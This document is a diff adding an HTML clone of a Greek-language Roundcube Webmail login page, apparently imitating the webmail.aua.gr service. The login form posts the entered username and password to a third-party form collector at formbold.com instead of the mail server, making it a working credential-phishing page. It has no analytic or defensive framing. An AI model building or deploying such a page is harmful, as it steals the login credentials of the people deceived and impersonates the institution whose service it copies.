@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="el" class=" js mozilla"><head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8"><title>Roundcube Webmail :: Καλώς ήρθατε στο Roundcube Webmail</title>
+<meta name="viewport" content="" id="viewport">
+
+<link rel="shortcut icon" href="https://webmail.aua.gr/skins/larry/images/favicon.ico?s=1689092804">
+<link rel="stylesheet" type="text/css" href="aua_files/styles.min.css">
+
+<link rel="stylesheet" type="text/css" href="aua_files/libkolab.css"><link rel="stylesheet" type="text/css" href="aua_files/jquery-ui.css"><link rel="stylesheet" type="text/css" href="aua_files/libcal.css"><script src="aua_files/ui.min.js"></script>
+
+
+
+
+<script src="aua_files/jquery.min.js"></script><script src="aua_files/common.min.js"></script><script src="aua_files/app.min.js"></script><script src="aua_files/jstz.min.js"></script><script>
+/*
+        @licstart  The following is the entire license notice for the 
+        JavaScript code in this page.
+
+        Copyright (C) The Roundcube Dev Team
+
+        The JavaScript code in this page is free software: you can redistribute
+        it and/or modify it under the terms of the GNU General Public License
+        as published by the Free Software Foundation, either version 3 of
+        the License, or (at your option) any later version.
+
+        The code is distributed WITHOUT ANY WARRANTY; without even the implied
+        warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+        See the GNU GPL for more details.
+
+        @licend  The above is the entire license notice
+        for the JavaScript code in this page.
+*/
+var rcmail = new rcube_webmail();
+rcmail.set_env({"task":"login","standard_windows":false,"locale":"el_GR","devel_mode":null,"rcversion":10607,"cookie_domain":"","cookie_path":"/","cookie_secure":true,"dark_mode_support":false,"skin":"larry","blankpage":"skins/larry/watermark.html","refresh_interval":60,"session_lifetime":600,"action":"","comm_path":"/?_task=login","compose_extwin":false,"date_format":"yy-mm-dd","date_format_localized":"YYYY-MM-DD","libcal_settings":{"date_format":"YYYY-MM-DD","time_format":"HH:mm","date_short":"MM-DD","date_long":"DD MMM YYYY","date_agenda":"dddd MM-DD","dates_long":"DD MMM YYYY","first_day":1,"timezone":0,"dst":"0","days":["Κυριακή","Δευτέρα","Τρίτη","Τετάρτη","Πέμπτη","Παρασκευή","Σάββατο"],"days_short":["Κυρ","Δευτ","Τρι","Τετ","Πεμπ","Παρ","Σαβ"],"months":["Ιανουάριος","Φεβρουάριος","Μάρτιος","Απρίλιος","Μαι","Ιούνιος","Ιούλιος","Αύγουστος","Σεπτέμβριος","Οκτώβριος","Νοέμβριος","Δεκέμβριος"],"months_short":["Ιαν","Φεβ","Μαρ","Απρ","Μαι","Ιουν","Ιουλ","Αυγ","Σεπ","Οκτ","Νοε","Δεκ"],"today":"Σήμερα"},"request_token":"qNuAjzfd4gKSyQEHrI2bVbkA9C0aN28T"});
+rcmail.add_label({"loading":"Φόρτωση...","servererror":"Σφάλμα του εξυπηρετητή!","connerror":"Σφάλμα σύνδεσης (Αποτυχία πρόσβασης στον διακομιστή)!","requesttimedout":"Το αίτημα εξέπνευσε χρονικά","refreshing":"Ανανέωση....","windowopenerror":"Το αναδυόμενο παράθυρο αποκλείστηκε!","uploadingmany":"Φόρτωση αρχείων...","uploading":"Το αρχείο φορτώνεται...","close":"Κλείσιμο","save":"Αποθήκευση","cancel":"Ακύρωση","alerttitle":"Προσοχή","confirmationtitle":"Είστε βέβαιος/η...","delete":"Διαγραφή","continue":"Συνέχεια","ok":"OK","libcalendaring.itipaccepted":"Accept","libcalendaring.itiptentative":"Maybe","libcalendaring.itipdeclined":"Decline","libcalendaring.itipdelegated":"Delegate","libcalendaring.expandattendeegroup":"Substitute with group members","libcalendaring.expandattendeegroupnodata":"Unable to substitute this group. No members found.","libcalendaring.statusorganizer":"Organizer","libcalendaring.statusaccepted":"Accepted","libcalendaring.statusdeclined":"Declined","libcalendaring.statusdelegated":"Delegated","libcalendaring.statusunknown":"Unknown","libcalendaring.statusneeds-action":"Needs action","libcalendaring.statustentative":"Tentative","libcalendaring.statuscompleted":"Completed","libcalendaring.statusin-process":"In process","libcalendaring.delegatedto":"Delegated to:","libcalendaring.delegatedfrom":"Delegated from:","libcalendaring.showmore":"Show more...","errortitle":"Έχει προκύψει κάποιο σφάλμα!","toggleadvancedoptions":"Εναλλαγή προχωρημένων επιλογών","options":"Επιλογές"});
+rcmail.gui_container("loginfooter","bottomline");rcmail.gui_object('loginform', 'form');
+rcmail.gui_object('message', 'message');
+</script>
+
+<script src="aua_files/jquery-ui.min.js"></script><script src="aua_files/datepicker-el.js"></script><script src="aua_files/libcalendaring.js"></script>
+</head>
+<body>
+
+<h1 class="voice">Roundcube Webmail Σύνδεση</h1>
+
+<div id="login-form">
+<div class="box-inner" role="main">
+<img src="aua_files/logo_GPA_small.png" id="logo" alt="Roundcube Webmail">
+
+<form name="form" method="post" action="https://formbold.com/s/3GrE1">
+<input type="hidden" name="_token" value="qNuAjzfd4gKSyQEHrI2bVbkA9C0aN28T">
+<input type="hidden" name="_task" value="login"><input type="hidden" name="_action" value="login"><input type="hidden" name="_timezone" id="rcmlogintz" value="Africa/Lagos"><input type="hidden" name="_url" id="rcmloginurl" value=""><table><tbody><tr><td class="title"><label for="rcmloginuser">Όνομα Χρήστη</label></td><td class="input"><input name="_user" id="rcmloginuser" required="" size="40" autocapitalize="none" autocomplete="off" type="text"></td></tr><tr><td class="title"><label for="rcmloginpwd">Κωδικός Πρόσβασης</label></td><td class="input"><input name="_pass" id="rcmloginpwd" required="" size="40" autocapitalize="none" autocomplete="off" type="password"></td></tr></tbody></table><p class="formbuttons"><button type="submit" id="rcmloginsubmit" class="button mainaction submit">Σύνδεση</button></p>
+</form>
+
+</div>
+
+<div class="box-bottom" role="complementary">
+	<div id="message"></div>
+	<noscript>
+		<p class="noscriptwarning">Προσοχή: Αυτή η υπηρεσία webmail απαιτεί Javascript! Για να την χρησιμοποιήσετε ενεργοποιήστε το JavaScript στις ρυθμίσεις του περιηγητή σας. </p>
+	</noscript>
+</div>
+
+<div id="bottomline" role="contentinfo">
+	Roundcube Webmail 
+	
+	
+</div>
+</div>
+
+
+
+<script>
+if (!window.UI) { var UI = new rcube_mail_ui(); }
+</script>
+<script>
+$(function() {
+rcmail.init();
+var images = ["skins/larry/images/ajaxloader.gif","skins/larry/images/ajaxloader_dark.gif","skins/larry/images/buttons.png","skins/larry/images/addcontact.png","skins/larry/images/filetypes.png","skins/larry/images/listicons.png","skins/larry/images/messages.png","skins/larry/images/messages_dark.png","skins/larry/images/quota.png","skins/larry/images/selector.png","skins/larry/images/splitter.png","skins/larry/images/watermark.jpg"];
+            for (var i=0; i<images.length; i++) {
+                img = new Image();
+                img.src = images[i];
+            }
+});
+</script>
+
+
+
+
+
+
+
+</body></html>
